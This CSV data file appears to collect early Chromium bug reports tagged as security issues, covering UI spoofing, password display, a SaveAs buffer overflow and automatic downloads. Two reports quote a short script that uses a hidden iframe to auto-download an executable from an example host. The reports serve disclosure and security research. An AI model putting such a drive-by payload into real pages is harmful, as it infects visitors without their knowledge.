,id,issue_id,date,report,Security,summary,description
1192,1192,1208,4-Sep-08,Issue 1208 : Never elide file extensions (at least in download UI) 8     &nbsp;   pkasting@chromium.org    In the download UI  and perhaps everywhere else  we should always show the file extension. Not doing so puts users at more risk from websites trying to spoof a file's type/characteristics. ,1,Issue 1208 : Never elide file extensions (at least in download UI) 8     &nbsp,pkasting@chromium.org    In the download UI  and perhaps everywhere else  we should always show the file extension. Not doing so puts users at more risk from websites trying to spoof a file's type/characteristics. 
1194,1194,1210,4-Sep-08,Issue 1210 : Don't trigger buttons on second click of a double-click 5     &nbsp;   pkasting@chromium.org    Buttons should not trigger on the second click of a double-click  if the first click was not on them. This helps avoid problems where the first click on something changes the UI and places a different button under the mouse for the second click. ,1,Issue 1210 : Don't trigger buttons on second click of a double-click 5     &nbsp,pkasting@chromium.org    Buttons should not trigger on the second click of a double-click  if the first click was not on them. This helps avoid problems where the first click on something changes the UI and places a different button under the mouse for the second click. 
1393,1393,1414,5-Sep-08,Issue 1414 : Chrome Buffer Overlow Vulnerability - &quot;SaveAs&quot; Function 4     &nbsp;   s...@bkav.com.vn    SVRT - Bkis have just discovered vulnerability in Google Chrome 0.2.149.27 and would like to inform you with this. Here comes the report: Details: - Type of Issue: Buffer Overflow. - Affected Software: Google Chrome 0.2.149.27. - Exploitation Environment: Google Chrome (Language: Vietnamese) on Windows XP SP2. - Impact: Remote code execution - Description: The vulnerability is caused due to a boundary error when handling the Ã¢ÂÂSaveAsÃ¢Â?function. On saving a malicious page with an overly long title (&lt;title&gt; tag in HTML)  the program causes a stack-based overflow and makes it possible for attackers to execute arbitrary code on usersÃ¢Â?systems. - How an attacker could exploit the issue : To exploit the Vulnerability  a hacker might construct a specially crafted Web page  which contains malicious code. He then tricks users into visiting his Website and convinces them to save this Page. Right after that  the code would be executed  giving him the privilege to make use of the affected system. - Exploitation code: Proof of Concept: Crash (Attached to this document). - Researcher: AnhLD Ã¢Â?SVRT member. - About SVRT : Bkis Vietnam is a security research center in Vietnam. SVRT  which is short for Security Vulnerability Research Team  is one of Bkis researching groups. SVRT specializes in the detection  alert and announcement of security vulnerabilities in software  operating systems  network protocols and embedded systems... - Contact detail: Name: Security Vulnerability Research Team. Bach Khoa Internetwork Security Center (Bkis) Hanoi University of Technology (Vietnam) Office: 5th Floor  Hitech building - 1A Dai Co Viet  Hanoi Email: svrt@bkav.com.vn WebBlog: security.bkis.vn Website: www.bkav.com.vn Chrome-Poc.html 3.5 KB &nbsp; View &nbsp; Download ,1,Issue 1414 : Chrome Buffer Overlow Vulnerability - &quot,SaveAs&quot Function 4     &nbsp s...@bkav.com.vn    SVRT - Bkis have just discovered vulnerability in Google Chrome 0.2.149.27 and would like to inform you with this. Here comes the report: Details: - Type of Issue: Buffer Overflow. - Affected Software: Google Chrome 0.2.149.27. - Exploitation Environment: Google Chrome (Language: Vietnamese) on Windows XP SP2. - Impact: Remote code execution - Description: The vulnerability is caused due to a boundary error when handling the Ã¢ÂÂSaveAsÃ¢Â function. On saving a malicious page with an overly long title (&lt title&gt tag in HTML)  the program causes a stack-based overflow and makes it possible for attackers to execute arbitrary code on usersÃ¢Â systems. - How an attacker could exploit the issue : To exploit the Vulnerability  a hacker might construct a specially crafted Web page  which contains malicious code. He then tricks users into visiting his Website and convinces them to save this Page. Right after that  the code would be executed  giving him the privilege to make use of the affected system. - Exploitation code: Proof of Concept: Crash (Attached to this document). - Researcher: AnhLD Ã¢Â SVRT member. - About SVRT : Bkis Vietnam is a security research center in Vietnam. SVRT  which is short for Security Vulnerability Research Team  is one of Bkis researching groups. SVRT specializes in the detection  alert and announcement of security vulnerabilities in software  operating systems  network protocols and embedded systems... - Contact detail: Name: Security Vulnerability Research Team. Bach Khoa Internetwork Security Center (Bkis) Hanoi University of Technology (Vietnam) Office: 5th Floor  Hitech building - 1A Dai Co Viet  Hanoi Email: svrt@bkav.com.vn WebBlog: security.bkis.vn Website: www.bkav.com.vn Chrome-Poc.html 3.5 KB &nbsp View &nbsp Download 
1623,1623,1647,6-Sep-08,Issue 1647 : Suggestions attempted for SSL sites 9     &nbsp;   dglead    When accessing a https site if the URL in the address bar is edited slightly then the URL is sent to the suggestion service on clients1.google.com. I don't think suggestions should be attempted for SSL sites as this could potentially send semi-sensitive URL data from a HTTPS site over plain HTTP. ,1,Issue 1647 : Suggestions attempted for SSL sites 9     &nbsp,dglead    When accessing a https site if the URL in the address bar is edited slightly then the URL is sent to the suggestion service on clients1.google.com. I don't think suggestions should be attempted for SSL sites as this could potentially send semi-sensitive URL data from a HTTPS site over plain HTTP. 
1733,1733,1758,7-Sep-08,Issue 1758 : in option window -- under save password - all passwords can be seen. 1 person starred this issue and may be notified of changes.   &nbsp;   gold.dudu    this should be invisible to any user or restricted by entering password. if it is a shared computer and a user saved password by mistake at any site   other users can retrieve the password. ,1,Issue 1758 : in option window -- under save password - all passwords can be seen. 1 person starred this issue and may be notified of changes.   &nbsp,gold.dudu    this should be invisible to any user or restricted by entering password. if it is a shared computer and a user saved password by mistake at any site   other users can retrieve the password. 
1760,1760,1785,7-Sep-08,Issue 1785 : Show Password 1 person starred this issue and may be notified of changes.   &nbsp;   gustavopulgar83    Hi. I know that this isn't a bug but i believe that  if you guys wants to keep the &quot;show password&quot; stuff (i dislike this option but i'm sure you have a reason for that) perhaps you should consider setting a master password or something. Keep up the good job! ,1,Issue 1785 : Show Password 1 person starred this issue and may be notified of changes.   &nbsp,gustavopulgar83    Hi. I know that this isn't a bug but i believe that  if you guys wants to keep the &quot show password&quot stuff (i dislike this option but i'm sure you have a reason for that) perhaps you should consider setting a master password or something. Keep up the good job! 
1802,1802,1827,8-Sep-08,Issue 1827 : Potential Automatic Download Annoyance 2     &nbsp;   elixer    Using a simple script: &quot; *************************************************************************** Author: nerex E-mail: nerex[at]live[dot]com Google's new Web browser (Chrome) allows files (e.g.  executables) to be automatically downloaded to the user's computer without any user prompt. This proof-of-concept was created for educational purposes only. Use the code it at your own risk. The author will not be responsible for any damages. Tested on Windows Vista SP1 and Windows XP SP3 with Google Chrome (BETA) ************************************************************************** &lt;script&gt; document.write('&lt;iframe src=&quot; http://www.example.com/hello.exe &quot; frameborder=&quot;0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;'); &lt;/script&gt; &quot; This was found by myself at a security site. I have reproduced the &quot;bug&quot; to a degree of potential annoyance at this site: http://pages.litx.org-a.googlepages.com/test2 ,1,Issue 1827 : Potential Automatic Download Annoyance 2     &nbsp,elixer    Using a simple script: &quot *************************************************************************** Author: nerex E-mail: nerex[at]live[dot]com Google's new Web browser (Chrome) allows files (e.g.  executables) to be automatically downloaded to the user's computer without any user prompt. This proof-of-concept was created for educational purposes only. Use the code it at your own risk. The author will not be responsible for any damages. Tested on Windows Vista SP1 and Windows XP SP3 with Google Chrome (BETA) ************************************************************************** &lt script&gt document.write('&lt iframe src=&quot http://www.example.com/hello.exe &quot frameborder=&quot 0&quot width=&quot 0&quot height=&quot 0&quot &gt ') &lt /script&gt &quot This was found by myself at a security site. I have reproduced the &quot bug&quot to a degree of potential annoyance at this site: http://pages.litx.org-a.googlepages.com/test2 
1943,1943,1971,9-Sep-08,Issue 1971 : omnibox shouldn't highlight subdomain 5 problem? 1. Navigate to any URL 2. Look at the way the omnibar highlights the URL  ? The domain name should be highlighted  but not the subdomain  ? The subdomain is highlighted     Phishing emails commonly contain links like http://yourbank.com.badsite.com/ to try to make you think it's a genuine link to yourbank.com  when in fact it's a link to badsite.com URL highlighting can make this type of misdirection obvious by highlighting the domain and not the subdomain. In the above example  only badsite.com should be highlighted  which tells the user they're not really on yourbank.com. Instead  Chrome highlights the subdomain as well  which doesn't help the user notice the misdirection. ,1,Issue 1971 : omnibox shouldn't highlight subdomain 5 problem,1. Navigate to any URL 2. Look at the way the omnibar highlights the URL   The domain name should be highlighted  but not the subdomain   The subdomain is highlighted     Phishing emails commonly contain links like http://yourbank.com.badsite.com/ to try to make you think it's a genuine link to yourbank.com  when in fact it's a link to badsite.com URL highlighting can make this type of misdirection obvious by highlighting the domain and not the subdomain. In the above example  only badsite.com should be highlighted  which tells the user they're not really on yourbank.com. Instead  Chrome highlights the subdomain as well  which doesn't help the user notice the misdirection. 
1958,1958,1987,9-Sep-08,Issue 1987 : Bug no Gerenciador de Download (PT/BR) 1 person starred this issue and may be notified of changes.   &nbsp;   dilan.nery    OlÃÂ¡  Estou escrevendo em protuguÃÂªs do brasil  pois nÃÂ£o escrevo em inglÃÂªs muito bem ^.^. Vim reportar um bug que foi descoberto  no gerenciador de downloads  como ele baixa automaticamente  se colocar um codigo malicioso como esse: &lt;script&gt; document.write('&lt;iframe src=&quot; http://www.examplo.com/virus.exe &quot; frameborder=&quot;0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;'); &lt;/script&gt; Seria possivel infectar o computador de um usuÃÂ¡rio sem que ele perceba. O Gerenciador de downloads deve ser configurado para perguntar ao usuÃÂ¡rio se deseja mesmo baixar. Com isso ele irÃÂ¡ ficar mais protegido. Atenciosamente  Dilan Nery Lopes ,1,Issue 1987 : Bug no Gerenciador de Download (PT/BR) 1 person starred this issue and may be notified of changes.   &nbsp,dilan.nery    OlÃÂ¡  Estou escrevendo em protuguÃÂªs do brasil  pois nÃÂ£o escrevo em inglÃÂªs muito bem ^.^. Vim reportar um bug que foi descoberto  no gerenciador de downloads  como ele baixa automaticamente  se colocar um codigo malicioso como esse: &lt script&gt document.write('&lt iframe src=&quot http://www.examplo.com/virus.exe &quot frameborder=&quot 0&quot width=&quot 0&quot height=&quot 0&quot &gt ') &lt /script&gt Seria possivel infectar o computador de um usuÃÂ¡rio sem que ele perceba. O Gerenciador de downloads deve ser configurado para perguntar ao usuÃÂ¡rio se deseja mesmo baixar. Com isso ele irÃÂ¡ ficar mais protegido. Atenciosamente  Dilan Nery Lopes 
2108,2108,2139,11-Sep-08,Issue 2139 : Chrome main proces crash. All tabs/windows of chrome are closed 3 problem? 1. Open website the website above in one tab 2. Open a new window of chrome 3. close the window with the website  ? Second window still open.  ? All Chrome windows are closed  and on restart chrome asks if it should restore my tabs.     At a other PC i have tryed the same website with chrome and there it does function normally.. -- FireFox also crashes -- Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 -- -- ,1,Issue 2139 : Chrome main proces crash. All tabs/windows of chrome are closed 3 problem,1. Open website the website above in one tab 2. Open a new window of chrome 3. close the window with the website   Second window still open.   All Chrome windows are closed  and on restart chrome asks if it should restore my tabs.     At a other PC i have tryed the same website with chrome and there it does function normally.. -- FireFox also crashes -- Mozilla/5.0 (Windows U Windows NT 5.1 nl rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 -- -- 
